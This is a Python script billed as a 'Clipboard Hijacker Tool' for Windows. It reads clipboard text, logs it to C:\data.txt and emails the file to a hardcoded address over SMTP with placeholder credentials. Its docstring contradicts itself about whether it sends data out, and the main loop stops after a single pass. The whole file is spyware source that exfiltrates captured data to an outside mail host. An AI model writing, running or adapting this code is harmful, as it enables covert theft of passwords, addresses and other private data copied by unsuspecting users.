#!/usr/bin/env python3
"""
Clipboard Hijacker Tool

This script monitors the clipboard and appends text content to a local log file.
It sends data over the network or establish any persistence.
It sends the data to the email address provided in the script.

Note: Outbound email or network exfiltration is intentionally added and documented.
Do not use this project to violate privacy or laws. 
"""

import win32clipboard # type: ignore
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path
import win32con # type: ignore

def get_clipboard():
  win32clipboard.OpenClipboard()
  data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
  win32clipboard.CloseClipboard()
  return data

def input_data():
  text_file = open("C:\\data.txt", "a")
  text_file.write("\n")
  text_file.write("\n")
  text_file.write("- ")
  text_file.write(text)
  text_file.close()

def mail_data():
  email = 'test@test.com'  # Mail from which you will receive mail
  password = 'test_password'
  send_to_email = 'test@test.com'  # Mail to where the data will be sent
  subject = 'Clipboard log file'
  message = 'Copied message is in the attached file. '
  file_location = 'C:\\data.txt'

  msg = MIMEMultipart()
  msg['From'] = email
  msg['To'] = send_to_email
  msg['Subject'] = subject

  msg.attach(MIMEText(message, 'plain'))

  # Setup the attachment
  filename = os.path.basename(file_location)
  attachment = open(file_location, "rb")
  part = MIMEBase('application', 'octet-stream')
  part.set_payload(attachment.read())
  encoders.encode_base64(part)
  part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

  # Attach the attachment to the MIMEMultipart object
  msg.attach(part)

  server = smtplib.SMTP('smtp.test.com', 587)
  server.starttls()
  server.login(email, password)
  text = msg.as_string()
  server.sendmail(email, send_to_email, text)
  server.quit()

# Main driver code
while True:
  time.sleep(3)
  text = get_clipboard()
  print(text)
  input_data()
  mail_data()
  break